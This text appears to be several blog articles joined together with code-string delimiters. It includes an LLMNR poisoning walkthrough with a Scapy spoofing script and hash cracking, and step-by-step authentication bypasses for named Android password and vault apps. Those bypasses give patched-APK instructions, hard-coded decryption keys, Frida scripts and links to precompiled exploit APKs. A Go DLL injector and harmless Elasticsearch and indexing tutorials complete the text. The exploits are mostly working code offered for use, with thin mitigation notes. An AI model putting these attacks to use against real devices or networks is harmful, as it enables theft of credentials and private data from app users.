LLMNR poisoning attack exploits the trust that a computer sending the query has towards all the other devices on the network.

In LLMNR poisoning, a rogue device sends a spoofed IPv4 as a response to a query tricking the computer who sent the query to connect to the rogue device instead of the actual target it was trying to reach (assuming the device name would’ve been successfully resolved). When the computer tries to login to the device _(this can either happen automatically if signed into a domain or the user will be prompted to enter credentials if on a home network)_ the device will claim that the credentials were faulty but in the background, it will store them for later use.

### In practice

There are a lot of tools that achieve the same thing, but I’m going to cover in my opinion, the best one. I’ll also cover a manual way.

**Automated LLMNR poisoning**

Starting out with the automated tool method, **_Responder_** ([https://github.com/SpiderLabs/Responder](https://github.com/SpiderLabs/Responder)) is a tool that can not only spoof LLMNR but also NBT-NS, mDNS and a heck of a lot more protocols. To install responder follow the steps for your specific distribution.

**Debian**

You may have to add the following sources to your sources.list if the current ones don’t have responder.:

\`\`\`
deb http://http.kali.org/kali kali-rolling main non-free contrib
deb-src http://http.kali.org/kali kali-rolling main non-free contrib
\`\`\`

After making sure your repos have the responder package you can run the following commands:

\`\`\`
apt update
apt install responder
\`\`\`

**Arch**

\`\`\`
yay -S responder
\`\`\`

**Using Responder**

After installing responder run the program with the following syntax:

\`\`\`
responder -I <Interface> 
\`\`\`

When starting responder you should see something like this:

![captionless image](https://miro.medium.com/v2/resize:fit:636/format:webp/1*sAP_EGw6_0EtKAIXP--e5w.png)

After starting responder, you can try going to Windows Explorer (on a windows machine in the same network) and entering this in to the top field: “//kdf4j5j4khkjl/something”. You should get a window prompting you to enter username and password if you’re not in a active directory. You can just make something up like “responder:rocks”. After entering the credentials, you should see output similar to this:

![(This is not my screenshot)](https://miro.medium.com/v2/resize:fit:1400/format:webp/0*9waonrcxKZW22ruw)

**LLMNR poisoning manually**

For the manual LLMNR poisoning, we’r going to use Scapy, a Python packet crafting module. First things off, we need to install Scapy with the following command (you need to install python3 and pip3 if you don’t already have them):

\`\`\`
pip3 install scapy
\`\`\`

Here’s the script, modify to your liking:

\`\`\`
from scapy.all import *
def sniffer(pkt):
    if UDP in pkt: 
        if pkt[UDP].dport == 5355:
            domain_requested = pkt[DNSQR].qname.decode('latin-1')[:-1]
            print(f"Spoofed domain:{domain_requested} Target:{pkt[IP].src}")
            spoofed_pack = (
                IP(dst=pkt[IP].src)/
                UDP()/
                LLMNRResponse(an=DNSRR(rrname=domain_requested, type="A", rdata="1.1.1.1"))
            )
            send(spoofed_pack, verbose=False)
sniff(prn=sniffer)
\`\`\`

This does only LLMNR poisoning, it does not capture credentials. Also change 1.1.1.1 to your own IP when running the script.

I recommend everyone to build their own from scratch and only use this as a reference if stuck, but I’m not your parents so do as you will.

Cracking NetNTLMv2 hash
-----------------------

### Theory

When using, for example, responder, you will get the NetNTLMv2 hash of the targeted user, and you might think “Well what now?” and the answer to that is you can either do a **_Pass-the-Hash attack_** (Here’s a good article on it:[https://juggernaut-sec.com/pass-the-hash-attacks/](https://juggernaut-sec.com/pass-the-hash-attacks/)) or you could crack it and use it like logging in as a normal user. We will go trough the ladder option.

### Practical

You can use any hash cracking tool, but I personally like Hashcat the best, so I’m going to use it for the following examples.

First, we need to determine what the “hash mode” (aka what kind of hash we’re cracking) is. We can find it by either scrolling through the Hashcat help page (you need to know the name of the hash for this) or by using my preferred method of visiting [https://hashcat.net/wiki/doku.php?id=example_hashes](https://hashcat.net/wiki/doku.php?id=example_hashes) and finding the hash mode by either comparing what the hash looks like or by searching the name of the hash. In this case, we know the name (NetNTLMv2) so we can press CTRL + F and search for it. After getting the hash mode (5600) we’ll try crack it using the following command (replace <hash> with the actual hash):

\`\`\`
hashcat -m 5600 <hash>
\`\`\`

If you successfully cracked the password, you should see the hash and the cleartext version of it at the end:

![(Not my image)](https://miro.medium.com/v2/resize:fit:1280/format:webp/0*sjYuJ2kO0pqe_yvZ)

Thank you for reading ❤
-----------------------`,ue=`Setting up and using Elasticsearch
==================================

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/0*uDcSSNEvN-iRfB3b)





What is Elasticsearch?
----------------------

Elasticsearch is a flexible search engine that uses a JSON REST API to communicate with clients. It stores data as [inverted indexes](https://www.geeksforgeeks.org/inverted-index/), making it much faster than traditional databases like MySQL or MongoDB.

Setting up Elasticsearch
------------------------

1.  Download Elasticsearch from: [https://www.elastic.co/downloads/elasticsearch](https://www.elastic.co/downloads/elasticsearch)
2.  Modify the config file at config/elasticsearch.yml to your liking (for example location where the data will be stored).
3.  Run the Elasticsearch binary at bin/elasticsearch **AS A NORMAL USER**
4.  Verify that the server is running correctly by running \`curl [http://127.0.0.1:9200](http://127.0.0.1:9200)\` . The curl output should look like this:

\`\`\`
{
    "name": "computer",
    "cluster_name": "elasticsearch",
    "cluster_uuid": "tXXXXXXXXXXXXXXXXX",
    "version": {
        "number": "8.6.2",
        "build_flavor": "default",
        "build_type": "tar",
        "build_hash": "2d58dXXXXXXXXXXXXXXXXXXXXXXXXXXXXX",
        "build_date": "202XXXXXXXXXXXXXXXXXX",
        "build_snapshot": false,
        "lucene_version": "9.4.2",
        "minimum_wire_compatibility_version": "7.17.0",
        "minimum_index_compatibility_version": "7.0.0"
    },
    "tagline": "You Know, for Search"
}
\`\`\`

Elasticsearch explained
-----------------------

*   Index = Kinda like a database or a high level definition to the data stored (like cars, company_x, etc…).
*   Document = Elasticsearch version of a row. This is not always the case, and you can usually define what a document means yourself.
*   Elasticsearch mainly uses a JSON REST API to do things.

Using Elasticsearch
-------------------

As previously mentioned, Elasticsearch uses a JSON REST API to do basically everything, so you can use almost any tool that can send custom HTTP REQUESTS to use Elasticsearch. I recommend Postman and Kibana.

### Storing data

Let’s say you have a small ecommerce site where you can search for products. For this, every time a user searches something, the back end might run something similar to this:

\`\`\`
POST http://127.0.0.1:9200/products/_doc/computer_parts
{
  "Kingston Fury Beast RGB 8GB": {
    "price": 31
  }
}
\`\`\`

Here the index is called “products” like as a kind of high level term, that can be specified more with the document name (computer_parts).

If the index “products” doesn’t exist, it will automatically create it, so you **don’t** need to create it separately. If the index and the document both exist, it will replace the whole document with the new JSON data.

Appending data (doesn’t overwrite documents):

\`\`\`
POST http://127.0.0.1:9200/products/_doc/computer_parts
{
     "query": {
        "term": {
            "_id": "computer_parts"
        }
     },
     "script": {
       "source": "ctx._source.newfield = json_data"
    }
} 
\`\`\`

### Retrieving and searching

To dump all the content of a document send this request:

\`\`\`
GET http://127.0.0.1:9200/index_name/_doc/document_name
\`\`\`

**Searching things:**

Easiest and most simple way (good if you need to just quickly search a lot of data for a string):

\`\`\`
GET http://127.0.0.1:9200/index_name/_search?q=search_query
GET http://127.0.0.1:9200/_search?q=search_query
\`\`\`

Post request (uses DSL Language and better for integration with other software):

\`\`\`
POST http://127.0.0.1:9200/index_name/_search
{
 "query":{
  "query_string": {
   "query": "search query here"
  }
 }
}
\`\`\`\`\`\`
POST http://127.0.0.1:9200/index_name/_search
{
  "query": {
    "match": {
      "phrase": {
        "query" : "ram"
      }
    }
  }
}
\`\`\`

DSL documentation: [https://www.elastic.co/guide/en/elasticsearch/reference/current/query-dsl-query-string-query.html](https://www.elastic.co/guide/en/elasticsearch/reference/current/query-dsl-query-string-query.html)

More example requests: [https://coralogix.com/blog/42-elasticsearch-query-examples-hands-on-tutorial/](https://coralogix.com/blog/42-elasticsearch-query-examples-hands-on-tutorial/)

### Some things you should know

*   Elasticsearch has a python library (The documentation is old but most commands are the same) [https://pypi.org/project/elasticsearch/](https://pypi.org/project/elasticsearch/)
*   Elasticsearch is like a clean canvas that you mold to your own needs for example: log analyzing, storing scientific test results, building your own AD network

Thank you for reading, hope this article helped you ❤
-----------------------------------------------------`,de=`Password manager -Sandeep Rathore <=1.8.14 (newest version) authentication bypass
=================================================================================


Theory section
--------------

Instead of using the user’s master password to encrypt and decrypt all the contents of the database the developer has instead decided to hard code the encryption key making the only function of the master password unlocking an UI showing all the saved credentials.

![org.sam.applications.passwordmanager.utilities.DecryptData](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*uKMu8e0jZryN7z5XlZdXxA.png)

Here you can see the encryption section of the app. Not only is it using a hard-coded encryption key (inside the red rectangle), but the encryption method is not very strong to begin with ([https://www.techtarget.com/searchsecurity/tip/Expert-advice-Encryption-101-Triple-DES-explained](https://www.techtarget.com/searchsecurity/tip/Expert-advice-Encryption-101-Triple-DES-explained)).

Now that we’ve figured out you don’t actually need the master password to decrypt the data, it’s only a matter of figuring out how to bypass the log-in screen to get access to all the stored credentials.

![org.sam.applications.passwordmanager.activities.LoginActivity](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ZMVxWw8ucXWxq9K9gKjlVw.png)

If we inspect the credential validation system, we can quickly figure out that the ONLY thing holding back an attacker from accessing ALL the data in the app is a boolean return value (true is access granted, false is access denied).

You might be wondering, **_“But hey, the device must be rooted so that Frida can be installed on it, or the app must be patched, but that would remove the data too when uninstalling the old version?”._** Usually this would be the case, but for some reason this app doesn’t delete the database after uninstalling it, so if you reinstall it, it will automatically use the previous database. This is great for the user experience but a critical error from a cyber security perspective.

Because the database will get automatically integrated with a new version or installation of the app, we can just patch the app to always return “true” from the function matchUsernameAndPassword, increase the version number by 1, and install the patched version (which will automatically replace the old one because Android thinks it’s an update).

Attack in practice
------------------

1.  Download the apk from: [https://apkpure.com/password-manager/org.sam.applications.passwordmanager](https://apkpure.com/password-manager/org.sam.applications.passwordmanager)
2.  Decompile the apk:

\`\`\`
apktool d "Password Manager_1.8.14_Apkpure.apk"
\`\`\`

3. Change the value of **_matchUsernameAndPassword()’s_** last return value in **_Password Manager_1.8.14_Apkpure/smali/org/sam/applications/passwordmanager/activities/LoginActivity.smali_** (line 304).

from “return v0” to “return v2”

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*acvIqPvL18yMXqwBYAQcjg.png)

4. Change versionCode in **_Password Manager_1.8.14_Apkpure/apktool.yml_** from “39” to “40” and versionName from “1.8.14” to “1.8.15”

5. Compile the folder:

\`\`\`
apktool b "Password Manager_1.8.14_Apkpure"
\`\`\`

6. Sign the apk:

\`\`\`
apk-signer "Password Manager_1.8.14_Apkpure/dist/Password Manager_1.8.14_Apkpure.apk"
\`\`\`

7. Deliver and install the apk to the target device.

Here’s a precompiled version:[**_https://anonfiles.com/b9IcD2j1zb/Password_Manager_1_8_14_bypass_apk_**](https://anonfiles.com/b9IcD2j1zb/Password_Manager_1_8_14_bypass_apk)

Mitigation
----------

1. Use the user’s master password to encrypt all the data.

2. Make it so that if the app is deleted, the database will also be deleted.

**Google play link (original, not the patched one):**[**https://play.google.com/store/apps/details?id=org.sam.applications.passwordmanager**](https://play.google.com/store/apps/details?id=org.sam.applications.passwordmanager)

### Thank you for reading, good luck on exploitation (legally of course) ❤`,fe=`HidePass password manager <1.9.1 (Newest version) password bypass vulnerability
===============================================================================



Theory section
--------------

Prerequisites: target phone (unlocked and USB debugging enabled), rooted phone, Linux machine, USB cable

In HidePass, the SHA-256 hash of the master password is used to encrypt and decrypt the contents of the database. This in and of itself is not a vulnerability, but the developers have forgotten to disable Android backups, so an attacker can use ADB to backup all the contents of **_/data/data/com.sisomobile.android.passwordsafe_** to the attacker’s own machine.

After retrieving the master password’s hash, the attacker can use the app’s own algorithm to generate an AES decryption key and start decrypting the database located in **_/data/data/com.sisomobile.android.passwordsafe/databases/my_password.db._**

Attack in practice
------------------

**Download the scripts needed for this exploit from https://github.com/Varppi/HidePass-exploit**

### Generating a decryption key

To get started let’s download and extract all the app’s data to our local machine by running:

\`\`\`
adb backup --noapk com.sisomobile.android.passwordsafe
java -jar android-backup-tookit/android-backup-processor/executable/abp.jar unpack backup.ab /tmp/archive.tar
tar xf /tmp/archive.tar
\`\`\`

The SHA-256 hash is stored in _/data/data/com.sisomobile.android.passwordsafe/shared_prefs/com.sisomobile.android.passwordsafe_preferences.xml_ **_or_** _apps/com.sisomobile.android.passwordsafe/sp/com.sisomobile.android.passwordsafe_preferences.xml_ on your local machine. After reading it, take the first 16 characters of it and put it in **_get_encrypted_sisomobile.js_** as a second argument to class1.b:

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*-mJQnx73pORZdOs9UqAG5w.png)

Now connect your rooted phone with HidePass installed to the attacker machine with an USB cable and start frida server. When you’re ready, execute the script **ON THE ROOTED DEVICE**.

After that, run generate_decryption_key.py <hash> <base64 encrypted sisomobile text>. The output should look something similar:

\`\`\`
$ python3 generate_decryption_key.py 55fdaf1304bede296032cb7d47041a57854ed6dd3338788533c7f076a4c63d51 6srxa1xWg9sVxOzMV9kn5Q==
04bede29srxa1xWg9sVxOzMV55fdaf13
$
\`\`\`

### Decrypting the database

Open the database in sqlitebrowser or in any program that lets you browse the contents of it. The passwords/logins are stored in the “safe” table.

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*yBdaBcs5G4J3-lCx9cYLFw.png)

Copy paste the encrypted text into the first parameter of “decrypt.js” and the decryption key as the second one.

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*lAwR2vjoO8dxHh9nEz-cyA.png)

Execute decrypt.js **ON THE ROOTED DEVICE** and you should get the cleartext version of whatever you were trying to decrypt.

Mitigation
----------

1.  Change the database file permissions so that it can’t be backed up.
2.  Don’t store the users hash and check it against the entered one but instead check if the key entered is able to decrypt the database or not.

(I have not tested these but in theory they should work)

Other things to note
--------------------

I couldn’t reproduce the decryption or encryption functions of the app, so instead it is using the app’s own functions to do them. If you manage to remake them in a Python script or whatever, then do comment a link to it for everybody to enjoy.

Here are the functions:

\`\`\`
    public static String a(String str, String str2) { //Decrypt (com.sisomobile.android.passwordsafe.a.g.a)
        try {
            byte[] decode = Base64.decode(str.getBytes(), 0);
            IvParameterSpec ivParameterSpec = new IvParameterSpec(str2.substring(0, 16).getBytes());
            SecretKeySpec secretKeySpec = new SecretKeySpec(str2.getBytes("UTF-8"), "AES");
            Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
            cipher.init(2, secretKeySpec, ivParameterSpec);
            return new String(cipher.doFinal(decode), "UTF-8");
        } catch (Exception e) {
            Log.d("debug", e.getMessage());
            return "";
        }
    }
    public static String b(String str, String str2) { //Encrypt (com.sisomobile.android.passwordsafe.a.b)
        try {
            byte[] bytes = str.getBytes("UTF-8");
            IvParameterSpec ivParameterSpec = new IvParameterSpec(str2.substring(0, 16).getBytes());
            SecretKeySpec secretKeySpec = new SecretKeySpec(str2.getBytes("UTF-8"), "AES");
            Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
            cipher.init(1, secretKeySpec, ivParameterSpec);
            return Base64.encodeToString(cipher.doFinal(bytes), 0);
        } catch (Exception e) {
            Log.d("debug", e.getMessage());
            return "";
        }
    }
\`\`\`

Thank you for reading!
----------------------`,pe=`Folder Lock Mobile <=2.8.1 (Newest version) password bypass
===========================================================



Note: This and Vault are the same app under a different name. Even some class names are the same or a permutation of them.
--------------------------------------------------------------------------------------------------------------------------

Theory
------

Because the app uses hard-coded encryption keys, an attacker can either download all the files stored in “_/FolderLock Encrypted Data/FolderLockFree_” and decrypt them later, either by using a Frida script or a custom tool.

An easier method instead is to exploit the app’s own function called “Data Recovery,” which decrypts and integrates the locked files back into the app. This is meant to be used by people who have accidentally deleted their app or something similar, but we can exploit it by simply reinstalling the app, setting a new password, and using the data recovery setting to get access to them. Easy as that.

Attack in practice
------------------

### Decrypting files using the app itself

**Prerequisites: Target phone unlocked**

1.  Reinstall the app via either google play store or adb
2.  Set it up with a password of your choice
3.  Go to settings → Data Recovery → Recover

4. Enjoy the data

(You might have to do this 2 times for some reason)

### Decrypting files manually

**Prerequisites: Rooted phone with this app installed and USB debugging enabled, USB cable, Linux machine, target phone unlocked**

1.  Download the file you want to decrypt from _/FolderLock Encrypted Data/FolderLockFree_ from your phone

2. Convert the file to base64

\`\`\`
base64 file > file.bs64
\`\`\`

3. Create a Frida script

\`\`\`
Java.perform(() => {
const a = Java.use("com.newsoftwares.folderlock_v1.c")
console.log(a.c("<base64 text here>"));
});
\`\`\`

4. Start the app on your rooted device and connect it to your Linux machine with an USB cable (make sure you have USB debugging enabled)

5. Run the Frida script

\`\`\`
frida -l script.js -U "Folder Lock" -o decrypted_file
\`\`\`

Here’s the decryption key (raw) in byte array format:120,71,121,72,122,73,123,74,124,75,125,76,126,77,127,78

Key generating function:

\`\`\`
public static byte[] f() {
    byte[] bArr = new byte[16];
    int i = 120;
    int i2 = 50;
    for (int i3 = 0; i3 < 16; i3++) {
        bArr[i3] = (byte) i;
        if (i2 % 2 == 0) {
            i2--;
            i -= i2;
        } else {
          i2++;
          i += i2;
       }
   }
   return bArr;
}
\`\`\`

Mitigation
----------

Don’t use hard-coded encryption keys but instead, ones derived from the master password

**Link to the play store page:**[**https://play.google.com/store/apps/details?id=com.newsoftwares.folderlock_v1**](https://play.google.com/store/apps/details?id=com.newsoftwares.folderlock_v1)

❤Thank you for reading❤
-----------------------`,k=`Secure Notes Lock <=1.6.6 (Newest version) multiple critical vulnerabilities
============================================================================




Vulnerability chain 1:
----------------------

### Cleartext Storage of Sensitive Information: Master password is stored in cleartext

### Missing Encryption of Sensitive Data: Notes and master password are not encrypted

### Insufficiently Protected Credentials:Attacker can use android backup to retrieve the XML file, where the password is stored

### Theory

The user’s password is not stored in encrypted form but is instead stored in cleartext in an XML file. Normally, you wouldn’t be able to read the contents of the file, but the developers have forgotten to disable android backups, so an attacker can effortlessly download and read all the databases and SharedPreferences, including the abovementioned XML file.

### Practical

Using the command below, you can download all the apps files. (you need to connect the target phone to your machine via USB and have USB debugging enabled)

\`\`\`
adb backup -noapk net.newsoftwares.noteslock
java -jar android-backup-tookit/android-backup-processor/executable/abp.jar unpack backup.ab /tmp/archive.tar
tar xf /tmp/archive.tar

\`\`\`

You should see a new directory called “apps” after running these commands.

![captionless image](https://miro.medium.com/v2/resize:fit:1322/format:webp/1*6zXF6yVZ8QWP8QqUekMB7A.png)

(The password is stored in apps/net.newsoftwares.noteslock/sp/SecurityLock.xml.)

Not only is the user’s PASSWORD stored in cleartext, but also the notes themselves. You can access the notes by using sqlitebrowser or basically any program that lets you browse sqlite type databases.

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*J_Qa4H0ltNcRDBIyGPawOw.png)

### Mitigation

Disallow android backups

Vulnerability chain 2:
----------------------

### Improper Certificate Validation: When updated, the app doesn’t check if it has a valid hash checksum

### Missing Encryption of Sensitive Data: Notes and master password are not encrypted

### Theory

Instead of encrypting the notes, and validating the user supplied password by trying to decrypt said notes with it and seeing if it succeeds or not, the app‘s only authentication mechanism is a single if condition that takes the password from SecurityLock.xml and checks it against the one the user entered.

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*5H2uhyitoT5VmtKO4l4JYQ.png)

This can be very easily bypassed by changing the “if password equals X” condition to a “if password doesn’t equal X” in the Smali source code of the app, changing the version number to make it look like an update and installing it to the target device.

### Practical

1.  **Decompile the APK using apktool:**

\`\`\`
apktool d "Secure Notes Lock - Notepad - _1.6.6.apk"
\`\`\`

**2. Open file _Secure Notes Lock - Notepad - _1.6.6/smali_classes2/net/newsoftwares/noteslock/LoginActivity.smali_ in a file editor on your choice and Change line 1167 from:**

\`\`\`
if-eqz v0, :cond_1
\`\`\`

**To:**

\`\`\`
if-nez v0, :cond_1
\`\`\`
![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*nYeGOEnJaFF_G0dgrA_Zuw.png)

**4.Increase “versionCode” by +1 and change “versionName” from “1.6.6” to “1.6.7” in _Secure Notes Lock — Notepad — _1.6.6/apktool.yml_**

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*WXLdzVJlbRLKzfNftyoAqg.png)

**5.Repackage the APK:**

\`\`\`
apktool b "Secure Notes Lock - Notepad - _1.6.6"
\`\`\`

**6.Sign the APK:**

\`\`\`
apk-signer "Secure Notes Lock - Notepad - _1.6.6/dist/Secure Notes Lock - Notepad - _1.6.6_Apkpure.apk"
\`\`\`

**7.Install the “Update” on the target device and login by typing in a random password.**

### Mitigation

Encrypt the database and don’t store the password, but instead check if the password the user gave can decrypt the database.

### **If you don’t want to make the exploit yourself, you can just download a pre made version from here:**[**https://anonfiles.com/J3B3q0k6ze/Secure_Notes_Lock_Notepad_1_6_6_exploit_apk**](https://anonfiles.com/J3B3q0k6ze/Secure_Notes_Lock_Notepad_1_6_6_exploit_apk)

### Google play link for the app:[https://play.google.com/store/apps/details?id=net.newsoftwares.noteslock](https://play.google.com/store/apps/details?id=net.newsoftwares.noteslock)

Thank you for reading, and ALWAYS remember to encrypt!
------------------------------------------------------`,me=`Photo Video Gallery Locker <= 1.3.2 (Newest version) password bypass
====================================================================


Theory
------

Like most of NewSoftware’s apps, this one also uses hard-coded encryption keys for encrypting your photos and videos. This app also has the “Data Recovery” setting found across almost all NewSoftware’s apps. The data recovery setting is just a cool term for “importing and decrypting all the files from a previous installation to the new one”. This, coupled with the fact that you don’t need the original credentials to decrypt the data (because the keys are hard-coded), can be exploited by simply reinstalling the app, setting a new password, and using the data recovery function to retrieve all the pictures and videos stored on the old app.

The attacks in practice
-----------------------

### Decrypting files using the app itself

**Prerequisites: Target phone unlocked**

1.  Reinstall the app via either google play store or adb
2.  Set it up with a password of your choice
3.  Go to settings → Data Recovery → Recover

4. Enjoy the data

Decrypting files manually
-------------------------

**Prerequisites: Rooted phone with this app installed and USB debugging enabled, USB cable, Linux machine, target phone unlocked**

1.  Download the file you want to decrypt from **_/Photo And Video Locker Encrypted Data/PhotoAndVideoLockerFree_** from your phone

2. Convert the file to base64

\`\`\`
base64 file > file.bs64
\`\`\`

3. Create a Frida script

\`\`\`
Java.perform(() => {
const Flaes = Java.use("net.newsoftwares.photandvideolocker.Flaes")
console.log(Flaes.getkv("<base64 text here>"));
});
\`\`\`

4. Start the app on your rooted device and connect it to your Linux machine with an USB cable (make sure you have USB debugging enabled)

5. Run the Frida script

\`\`\`
frida -l script.js -U "Photo and Video Locker" -o decrypted_file
\`\`\`

Here’s the decryption key (raw) in byte array format:120,71,121,72,122,73,123,74,124,75,125,76,126,77,127,78

Key generating function:

\`\`\`
public static byte[] getkv() {
    byte[] bArr = new byte[16];
    int i = 120;
    int i2 = 50;
    for (int i3 = 0; i3 < 16; i3++) {
        bArr[i3] = (byte) i;
        if (i2 % 2 == 0) {
            i2--;
            i -= i2;
        } else {
          i2++;
          i += i2;
       }
   }
   return bArr;
}
\`\`\`

Mitigation
----------

Don’t use hard-coded encryption keys but instead, ones derived from the master password

**Link to the play store page:**[https://play.google.com/store/apps/details?id=net.newsoftwares.photandvideolocker](https://play.google.com/store/apps/details?id=net.newsoftwares.photandvideolocker)`,he=`Vault -NewSoftwares LLC <=1.4.9 (Newest version) password bypass
================================================================




Note: This and Folder Lock are the same app under a different name. Even some class names are the same or the word “advanced” is slapped after them.
----------------------------------------------------------------------------------------------------------------------------------------------------

![captionless image](https://miro.medium.com/v2/resize:fit:1210/format:webp/1*IANAon1-Dgt9gfMjLkoGRg.png)

Theory
------

Because the app uses hard-coded encryption keys, an attacker can either download all the files stored in “**_/FolderLock Advanced Encrypted Data/FolderLockAdvancedFree_**” and decrypt them later, either by using a Frida script or a custom tool.

An easier method instead is to exploit the app’s own function called “Data Recovery,” which decrypts and integrates the locked files back into the app. This is meant to be used by people who have accidentally deleted their app or something similar, but we can exploit it by simply reinstalling the app, setting a new password, and using the data recovery setting to get access to them. Easy as that.

Attack in practice
------------------

### Decrypting files using the app itself

**Prerequisites: Target phone unlocked**

1.  Reinstall the app via either google play store or adb
2.  Set it up with a password of your choice
3.  Go to settings → Data Recovery → Recover

4. Enjoy the data

(You might have to do this 2 times for some reason)

### Decrypting files manually

**Prerequisites: Rooted phone with this app installed and USB debugging enabled, USB cable, Linux machine, target phone unlocked**

1.  Download the file you want to decrypt from **_/FolderLock Advanced Encrypted Data/FolderLockAdvancedFree_** from your phone

2. Convert the file to base64

\`\`\`
base64 file > file.bs64
\`\`\`

3. Create a Frida script

\`\`\`
Java.perform(() => {
const b = Java.use("net.newsoftwares.folderlockadvanced.b")
console.log(b.d("<base64 text here>"));
});
\`\`\`

4. Start the app on your rooted device and connect it to your Linux machine with an USB cable (make sure you have USB debugging enabled)

5. Run the Frida script

\`\`\`
frida -l script.js -U "Vault" -o decrypted_file
\`\`\`

Here’s the decryption key (raw) in byte array format:120,71,121,72,122,73,123,74,124,75,125,76,126,77,127,78

Key generating function:

\`\`\`
public static byte[] f() {
    byte[] bArr = new byte[16];
    int i = 120;
    int i2 = 50;
    for (int i3 = 0; i3 < 16; i3++) {
        bArr[i3] = (byte) i;
        if (i2 % 2 == 0) {
            i2--;
            i -= i2;
        } else {
          i2++;
          i += i2;
       }
   }
   return bArr;
}
\`\`\`

Mitigation
----------

Don’t use hard-coded encryption keys but instead, ones derived from the master password

**Link to the play store page:**[https://play.google.com/store/apps/details?id=net.newsoftwares.folderlockadvanced](https://play.google.com/store/apps/details?id=net.newsoftwares.folderlockadvanced)

❤Thank you for reading❤
-----------------------`,ge=`DLL creation and injection with Golang
======================================

![https://github.com/SpoofIMEI/GoDLLInjector](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*CZyVwXFPhLs07fMo7dIhsg.png)




I couldn’t find any good sources to learn DLL injection and making with Golang so hopefully this makes someones life easier who is trying to research this in the future. (This article assumes you already have understanding of how DLLs and DLL injection works)

Making DLLs
-----------

Making DLLs in Golang is very similar to creating a normal program but with a few differences:

*   You need to import the \`C\` module
*   Exports are marked using comments like this: \`//export functionName\`
*   You need a main function but nothing actually inside it

**Here’s an example DLL:**

\`\`\`
package main
import "C"
import (
 "fmt"
)
//export HelloWorld
func HelloWorld() {
 fmt.Println("Hello World!")
}
func main() {}
\`\`\`

**Instead of DllMain, Golang calls it “init”. Unlike other exports, you don’t add the export comment above it.**

**Here’s how to use it:**

\`\`\`
package main
import "C"
import (
 "fmt"
)
func init() {
 fmt.Println("Hello World!")
}
func main() {}
\`\`\`

(This function is where you will put the payload that you want to execute when the DLL is loaded)

**Compiling the DLL (via the command line):**

\`\`\`
go build -o dllmain.dll -buildmode=c-shared dllmain.go
\`\`\`

This creates 2 files in the current directory, dllmain.h and dllmain.dll.

**To load and execute a DLL (include the comments):**

\`\`\`
package main
// #cgo LDFLAGS: -L. -ldllmain
// #include "dllmain.h"
import "C"
func main() {
 C.HelloWorld()
}
\`\`\`

Injecting DLLs
--------------

### DLL injector at its simplest:

\`\`\`
package main
import (
 "flag"
 "fmt"
 "log"
 "syscall"
 "golang.org/x/sys/windows"
)
func main() {
 //CHANGE THESE
 dPath := "DLL_PATH" //Path to the DLL file to inject
 pId := uintptr(PROCESS_ID) //Process ID
 ////
 kernel32 := windows.NewLazyDLL("kernel32.dll")
 //Opens a handle to the target process with the needed permissions
 pHandle, err := windows.OpenProcess(windows.PROCESS_CREATE_THREAD|windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION, false, uint32(pId))
 if err != nil {
  log.Fatal(err)
 }
 fmt.Println("Process opened")
 ////
 //Allocates virtual memory for the file path
 VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
 vAlloc, _, err := VirtualAllocEx.Call(uintptr(pHandle), 0, uintptr(len(dPath)+1), windows.MEM_RESERVE|windows.MEM_COMMIT, windows.PAGE_EXECUTE_READWRITE)
 fmt.Println("Memory allocated")
 //// 
 
 //Converts the file path to type *byte
 bPtrDpath, err := windows.BytePtrFromString(dPath)
 if err != nil {
  log.Fatal(err)
 }
 ////
 
 //Writes the filename to the previously allocated space
 Zero := uintptr(0)
 err = windows.WriteProcessMemory(pHandle, vAlloc, bPtrDpath, uintptr(len(dPath)+1), &Zero)
 if err != nil {
  log.Fatal(err)
 }
 fmt.Println("DLL path written")
 ////
 
 //Gets a pointer to the LoadLibrary function
 LoadLibAddr, err := syscall.GetProcAddress(syscall.Handle(kernel32.Handle()), "LoadLibraryA")
 if err != nil {
  log.Fatal(err)
 }
 ////
 
 //Creates a remote thread that loads the DLL triggering it
 tHandle, _, _ := kernel32.NewProc("CreateRemoteThread").Call(uintptr(pHandle), 0, 0, LoadLibAddr, vAlloc, 0, 0)
 defer syscall.CloseHandle(syscall.Handle(tHandle))
 fmt.Println("DLL Injected")
 ////
}
\`\`\`

Here’s one with little more features: [https://github.com/SpoofIMEI/GoDLLInjector](https://github.com/R00tendo/GoDLLInjector)

### DLL to test if the injector works (opens a message box):

\`\`\`
package main
import "C"
import (
 "syscall"
 "golang.org/x/sys/windows"
)
func init() {
 windows.MessageBox(windows.HWND(0), syscall.StringToUTF16Ptr("Injected"), syscall.StringToUTF16Ptr("Injection works"), windows.MB_OK)
}
func main() {}
\`\`\``,_e=`Searching through huge amounts of unstructured data fast(Inverted Index)
========================================================================

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Qs2Zapz-0rIPBBF8HyMgyw.png)



Introduction
------------

The problem with traditional methods of searching through data is that they are pretty slow and searching through a huge amount of it is a massive time commitment, be it on the client or server side. This is where indexing comes in. Indexing is at its core just organizing data so that it can be searched through **_fast_** and **_with minimal resources_**. In our case, with unstructured data, using an inverted index is probably the best option to go with. Here are the 2 steps involved with indexing (with inverted index):

1.  Separating keywords/other data of interest. (tokenization)
2.  Sorting it and storing it in a way where it can be traversed fast. (indexing)

Let’s go through both of those steps in more detail.

Tokenization and Filters
------------------------

This step is the process of converting text into “tokens”, a list of keywords that can be searched. Before we break the text, we might want to do some filtering. Filtering is just what it sounds like, filtering useless data out of the text. Here are some examples of filtering:

*   Removing common words like the/a/on/in/of from the text
*   Making everything lowercase
*   Removing numbers

Filters can be applied for different reasons depending on the project you’re working on.

